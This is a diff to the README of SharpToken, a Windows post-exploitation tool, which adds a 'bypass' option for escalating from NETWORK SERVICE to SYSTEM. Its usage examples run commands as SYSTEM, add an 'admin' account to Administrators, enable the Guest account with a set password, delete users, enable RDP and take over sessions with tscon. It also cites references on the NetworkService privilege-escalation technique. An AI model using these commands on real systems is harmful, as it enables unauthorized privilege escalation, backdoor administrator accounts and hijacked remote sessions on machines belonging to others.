@@ -14,42 +14,53 @@ SharpToken By BeichenDream
 
 Github : https://github.com/BeichenDream/SharpToken
 
+If you are an NT AUTHORITY\NETWORK SERVICE user then you just need to add the bypass parameter to become an NT AUTHORIT\YSYSTEM
+e.g.
+SharpToken execute "NT AUTHORITY\SYSTEM" "cmd /c whoami" bypass
+
+
 Usage:
 
 SharpToken COMMAND arguments
 
+
+
 COMMANDS:
 
-	list_token [process pid]	
+        list_token [process pid]        [bypass]
 
-	list_all_token [process pid]
+        list_all_token [process pid] [bypass]
 
-	add_user    <username> <password> [group] [domain]
+        add_user    <username> <password> [group] [domain] [bypass]
 
-	enableUser <username> <NewPassword> [NewGroup]
+        enableUser <username> <NewPassword> [NewGroup] [bypass]
 
-	delete_user <username> [domain]
-    
-	execute <tokenUser> <commandLine> [Interactive]
+        delete_user <username> [domain] [bypass]
 
-	enableRDP
+        execute <tokenUser> <commandLine> [Interactive] [bypass]
 
-	tscon <targetSessionId> [sourceSessionId]
+        enableRDP [bypass]
+
+        tscon <targetSessionId> [sourceSessionId] [bypass]
 
 
 example:
     SharpToken list_token
+    SharpToken list_token bypass
     SharpToken list_token 6543
     SharpToken add_user admin Abcd1234! Administrators
     SharpToken enableUser Guest Abcd1234! Administrators
     SharpToken delete_user admin
     SharpToken execute "NT AUTHORITY\SYSTEM" "cmd /c whoami"
+    SharpToken execute "NT AUTHORITY\SYSTEM" "cmd /c whoami" bypass
     SharpToken execute "NT AUTHORITY\SYSTEM" cmd true
+    SharpToken execute "NT AUTHORITY\SYSTEM" cmd true bypass
     SharpToken tscon 1
 
 
-```
 
+
+```
 
 ## 枚举Token
 
@@ -86,3 +97,9 @@ SharpToken execute "NT AUTHORITY\SYSTEM" "cmd /c whoami"
 ```
 
 ![image](https://user-images.githubusercontent.com/43266206/176751980-dd9413f4-1a4d-4cb0-8ba2-5e0b9ccb2eed.png)
+
+## 引用
+
+https://www.tiraniddo.dev/2020/04/sharing-logon-session-little-too-much.html
+
+https://github.com/decoder-it/NetworkServiceExploit
